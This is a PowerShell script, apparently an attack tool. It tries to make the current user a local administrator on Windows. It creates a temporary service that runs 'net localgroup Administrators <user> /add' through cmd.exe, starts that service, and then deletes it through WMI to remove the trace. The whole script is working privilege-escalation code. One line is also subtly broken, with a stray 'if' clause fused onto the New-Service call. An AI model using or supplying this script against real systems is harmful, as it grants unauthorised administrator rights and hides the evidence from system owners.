
$TempServiceName = "TestService"

Write-Host -ForegroundColor Green [+] -NoNewline

Write-Host -ForegroundColor Yellow " Checking Local Admin Membership Status"

$username = "$env:USERDOMAIN\$env:USERNAME"

if (net localgroup Administrators | select-string -SimpleMatch $username)
{  
    Write-Host -ForegroundColor Green "`tLocalAdmin:" -NoNewline
    write-host -ForegroundColor white "`t$username => $true"
}
else
{
    Write-Host -ForegroundColor Green "`tLocalAdmin:" -NoNewline
    write-host -ForegroundColor white "`tAdding => $username`n"    

    Write-Host -ForegroundColor Green [+] -NoNewline
    Write-Host -ForegroundColor Yellow " Adding Service"

    $createService = New-Service -Name $TempServiceName -BinaryPathName "C:\windows\system32\CMD.exe /K net localgroup Administrators $username /add"-StartupType Manual if (get-service $TempServiceName)
    
    if (get-service $TempServiceName)
    {
        Write-Host -ForegroundColor Green "`tServiceStatus:" -NoNewline
        write-host -ForegroundColor white "`tTestService => $true`n" 

        Start-Sleep -Milliseconds 500

        Write-Host -ForegroundColor Green [+] -NoNewline
        Write-Host -ForegroundColor Yellow " Starting Service Adding Local Admin $username"

        $Service = Start-Service TestService -ErrorAction SilentlyContinue

        Write-Host -ForegroundColor Green [+] -NoNewline
        Write-Host -ForegroundColor Yellow " Deleting Service"

        Try
        {
            Write-Host -ForegroundColor Green "[+] " -NoNewline
            Write-Host -ForegroundColor Yellow "Service Status" -NoNewline

            $DeleteService = (Get-WmiObject win32_service -Filter "name='$TempServiceName'").delete()

            write-host -ForegroundColor Green " => " -NoNewline
            write-host -ForegroundColor White "Service Deleted`n"
         }
         catch
         {
            write-host -ForegroundColor red " => " -NoNewline
            write-host -ForegroundColor White "Unable to Delete Service`n"
         }

         Write-Host -ForegroundColor Green [+] -NoNewline
         Write-Host -ForegroundColor Yellow " Checking Admin Status [$TempServiceName]"

         if (net localgroup Administrators | select-string -SimpleMatch $username)
         {  
            Write-Host -ForegroundColor Green "`tLocalAdmin:" -NoNewline
            write-host -ForegroundColor white " $username => $true"
         }
         Else
         {
            Write-Host -ForegroundColor Red "`tLocalAdmin:" -NoNewline
            write-host -ForegroundColor Red " $username => $False"
         }
    }
  } 
